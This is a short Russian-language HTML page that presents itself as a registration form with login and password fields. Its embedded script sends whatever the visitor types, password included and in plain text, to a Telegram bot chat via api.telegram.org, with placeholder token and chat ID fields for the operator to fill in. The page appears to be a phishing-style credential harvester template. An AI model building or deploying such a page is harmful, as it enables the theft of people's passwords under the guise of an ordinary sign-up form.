<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Регистрация</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; }
    input { width: 100%; padding: 8px; box-sizing: border-box; }
    button { background: #007BFF; color: white; padding: 10px 15px; border: none; cursor: pointer; }
    .message { margin-top: 20px; color: green; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Регистрация</h2>
  <div class="form-group">
    <label for="username">Логин:</label>
    <input type="text" id="username" required>
  </div>
  <div class="form-group">
    <label for="password">Пароль:</label>
    <input type="password" id="password" required>
  </div>
  <button onclick="sendToTelegram()">Отправить</button>
  <div id="result" class="message"></div>

  <script>
    // НАСТРОЙКИ TELEGRAM
    const TELEGRAM_TOKEN = 5939621978;  // замените на токен бота
    const CHAT_ID = 'ВАШ_CHAT_ID';          // замените на ваш chat_id

    async function sendToTelegram() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const message = `Новая регистрация!\nЛогин: ${username}\nПароль: ${password}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
          }
        );

        if (response.ok) {
          document.getElementById('result').textContent = 'Данные отправлены!';
        } else {
          document.getElementById('result').textContent = 'Ошибка отправки.';
        }
      } catch (error) {
        document.getElementById('result').textContent = 'Ошибка сети.';
      }
    }
  </script>
</body>
</html>
